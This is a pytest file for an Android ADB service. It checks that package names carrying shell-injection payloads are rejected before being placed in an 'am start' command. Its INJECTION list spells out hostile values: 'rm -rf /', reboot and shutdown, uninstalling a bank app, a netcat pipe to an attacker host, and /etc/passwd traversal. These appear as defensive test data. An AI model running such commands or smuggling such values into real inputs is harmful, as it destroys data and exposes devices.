"""
Tests for the ADB shell-injection guard in open_play_store.

A package name is interpolated into an `am start ... -d "market://..."` shell
command, so it must be validated before any device I/O happens.
"""

from __future__ import annotations

import pytest

from app.services.android import AndroidError, _PACKAGE_RE, open_play_store

VALID = ["com.whatsapp", "com.google.android.youtube", "org.mozilla.firefox", "a.b.c"]
INJECTION = [
    'com.evil";reboot;"',
    "com.evil$(rm -rf /)",
    "com.evil && shutdown",
    "com.evil`id`",
    "com.evil;pm uninstall com.bank",
    "com.evil | nc attacker 4444",
    "../../etc/passwd",
    "",
    "com.evil app",  # space
]


@pytest.mark.parametrize("pkg", VALID)
def test_regex_accepts_valid_package_names(pkg):
    assert _PACKAGE_RE.match(pkg)


@pytest.mark.parametrize("pkg", INJECTION)
def test_regex_rejects_injection_payloads(pkg):
    assert not _PACKAGE_RE.match(pkg)


@pytest.mark.parametrize("pkg", INJECTION)
async def test_open_play_store_raises_before_any_io(pkg):
    # Must raise on validation, never attempt to connect to 10.255.255.255.
    with pytest.raises(AndroidError):
        await open_play_store("10.255.255.255", 5555, pkg)
